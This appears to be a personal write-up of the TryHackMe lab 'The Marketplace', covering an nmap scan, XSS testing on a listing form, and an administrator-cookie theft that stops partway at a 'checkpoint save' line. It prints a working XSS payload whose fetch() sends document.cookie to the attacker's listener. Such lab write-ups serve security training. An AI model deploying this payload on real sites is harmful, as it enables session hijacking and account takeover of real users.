---
title: TryHackMe The Marketplace Writeup
date: 2023-07-05T13:34:41.636Z
description: My solution for the TryHackMe Room "The marketplace"
---
T﻿his room is rated at medium difficulty and covers some interesting topics such as XSS (cross-site scripting), SQL Injection, and a couple of methods for privilege escalation. For me, the victim machine is at address `10.10.15.67`

## R﻿econnaissance

S﻿tarting with an `nmap`scan to find running services and open ports.

```shell
$ nmap -sV 10.10.15.67
```

```
Nmap scan report for ip-10-10-15-67.eu-west-1.compute.internal (10.10.15.67)
Host is up (0.00038s latency).
Not shown: 997 filtered ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    nginx 1.19.2
32768/tcp open  http    Node.js (Express middleware)
...
```

F﻿rom this we can see that there is a web server running on the machine, as well and an OpenSSH instance. Let's start by taking a look at the web page .by navigating to `http://10.10.15.67` in a browser

![](/img/webpage.png)

T﻿he website seems to be some sort of online marketplace (surprise, surprise). Poking around on the website uncovers the ability to log in or sign up to create an account. After signing up and logging in, there were some new options available to me: the ability to create a listing, and to view messages for my account. As well as this, there was a session cookie created with the name `token`. These session cookies are used by the browser in order to tell what user is logged in, in order to show them the correct content on the page.

I﻿f we can somehow replace our own session token with one of an administrator or high-level user, we will likely be able to have some administrative options which may help us obtain a reverse shell on the machine. Let's try creating a listing. On the listing creation page, there is a simple form to input the title and content of the listing, we can try testing for XSS vulnerabilities by attempting to embed a textarea element into the page (in the content field). When we then view the listing, and a textarea field is present, we know that the site is vulnerable to XSS injection. 

![](/img/textarea.png)

![](/img/textareaworking.png)

W﻿ith an XSS vulnerability present, we can create a malicious listing that will steal the user's cookie and send it to our web server (which we will set up shortly). When we use the "report listing to administrator" function on the website, the THM machine will automatically mimic an administrator navigating to the listing. With this, we will be able to steal their cookie.

F﻿irst, the cookie stealing payload:

> `<script>fetch('http://<YOUR_MACHINE_IP>:8000/steal?cookie='+btoa(document.cookie));</script>`

T﻿hen, the setup of the web server using python:

```shell
$ python3 -m http.server
```

N﻿ow, let's submit the listing, and report it to the administrators.

![](/img/listing.png)

![](/img/reported.png)

I﻿f we look in our web server console, sure enough we got the cookie! We will need to base64 decode the cookie into order to get the administrator's token.

![](/img/gotcookie.png)

c﻿heckpoint save